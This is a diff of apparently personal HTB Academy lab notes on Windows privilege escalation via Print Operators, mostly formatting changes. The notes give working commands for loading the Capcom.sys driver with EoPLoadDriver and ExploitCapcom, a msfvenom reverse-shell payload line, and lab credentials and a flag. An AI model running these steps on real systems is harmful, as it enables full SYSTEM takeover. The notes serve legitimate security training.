@@ -1,4 +1,4 @@
-# Print Operators Privilege Escalation
+# 🖨️ Print Operators
 
 ## 🎯 Overview
 
@@ -16,6 +16,7 @@ SeShutdownPrivilege           # Shut down Domain Controller
 ## 🔧 Driver Loading Exploitation
 
 ### Privilege Verification
+
 ```cmd
 # Check privileges (may need UAC bypass first)
 whoami /priv
@@ -27,6 +28,7 @@ SeLoadDriverPrivilege         Load and unload device drivers       Disabled
 ### Capcom.sys Driver Attack
 
 #### 1. Registry Configuration
+
 ```cmd
 # Add driver reference to registry
 reg add HKCU\System\CurrentControlSet\CAPCOM /v ImagePath /t REG_SZ /d "\??\C:\Tools\Capcom.sys"
@@ -36,6 +38,7 @@ reg add HKCU\System\CurrentControlSet\CAPCOM /v Type /t REG_DWORD /d 1
 ```
 
 #### 2. Enable Privilege & Load Driver
+
 ```cmd
 # Method A: Use EnableSeLoadDriverPrivilege.exe
 EnableSeLoadDriverPrivilege.exe
@@ -49,6 +52,7 @@ EoPLoadDriver.exe System\CurrentControlSet\Capcom c:\Tools\Capcom.sys
 ```
 
 #### 3. Exploit Driver for SYSTEM
+
 ```cmd
 # Execute ExploitCapcom.exe
 ExploitCapcom.exe
@@ -65,15 +69,17 @@ ExploitCapcom.exe
 ## 🎯 HTB Academy Lab Solution
 
 ### Lab Environment
-- **Credentials**: `printsvc:HTB_@cademy_stdnt!`
-- **Access Method**: xfreerdp
-- **Tools Location**: `C:\Tools\` and `C:\Tools\ExploitCapcom\`
-- **Objective**: Escalate to SYSTEM and retrieve flag from Administrator desktop
-- **Flag**: `Pr1nt_0p3rat0rs_ftw!`
+
+* **Credentials**: `printsvc:HTB_@cademy_stdnt!`
+* **Access Method**: xfreerdp
+* **Tools Location**: `C:\Tools\` and `C:\Tools\ExploitCapcom\`
+* **Objective**: Escalate to SYSTEM and retrieve flag from Administrator desktop
+* **Flag**: `Pr1nt_0p3rat0rs_ftw!`
 
 ### Detailed Walkthrough
 
 #### 1. Connect via RDP
+
 ```bash
 # Connect to target using xfreerdp
 xfreerdp /v:TARGET_IP /u:printsvc /p:HTB_@cademy_stdnt!
@@ -84,12 +90,14 @@ xfreerdp /v:TARGET_IP /u:printsvc /p:HTB_@cademy_stdnt!
 ```
 
 #### 2. Open Elevated Command Prompt
+
 ```cmd
 # Right-click Command Prompt → "Run as administrator"
 # Supply credentials: printsvc:HTB_@cademy_stdnt! when prompted
 ```
 
 #### 3. Navigate to Tools and Execute EoPLoadDriver
+
 ```cmd
 cd C:\Tools
 EoPLoadDriver.exe System\CurrentControlSet\Capcom c:\Tools\Capcom.sys
@@ -103,6 +111,7 @@ NTSTATUS: 00000000, WinError: 0
 ```
 
 #### 4. Navigate to ExploitCapcom Directory
+
 ```cmd
 cd ExploitCapcom
 ExploitCapcom.exe
@@ -118,6 +127,7 @@ ExploitCapcom.exe
 ```
 
 #### 5. Retrieve Flag from SYSTEM Shell
+
 ```cmd
 type C:\Users\Administrator\Desktop\flag.txt
 
@@ -127,6 +137,7 @@ type C:\Users\Administrator\Desktop\flag.txt
 ## 🔄 Alternative Methods
 
 ### Non-GUI Exploitation
+
 ```c
 // Modify ExploitCapcom.cpp line 292 for reverse shell:
 TCHAR CommandLine[] = TEXT("C:\\ProgramData\\revshell.exe");
@@ -136,6 +147,7 @@ msfvenom -p windows/x64/shell_reverse_tcp LHOST=IP LPORT=443 -f exe -o revshell.
 ```
 
 ### Automated Approach
+
 ```cmd
 # Single command with EoPLoadDriver
 EoPLoadDriver.exe System\CurrentControlSet\Capcom c:\Tools\Capcom.sys
@@ -157,6 +169,7 @@ The operation completed successfully.
 ## ⚠️ Limitations
 
 ### Windows Version Restrictions
+
 ```cmd
 # MITIGATED: Windows 10 Version 1803+
 # SeLoadDriverPrivilege no longer exploitable
@@ -164,6 +177,7 @@ The operation completed successfully.
 ```
 
 ### Detection Indicators
+
 ```cmd
 # Monitor for:
 - Driver loading events
@@ -180,6 +194,6 @@ The operation completed successfully.
 4. **Multiple tools available** for automation
 5. **Mitigated** on Windows 10 1803+
 
----
+***
 
-*Print Operators group exploitation relies on vulnerable driver loading capabilities, effective primarily on legacy Windows systems.* 
+_Print Operators group exploitation relies on vulnerable driver loading capabilities, effective primarily on legacy Windows systems._
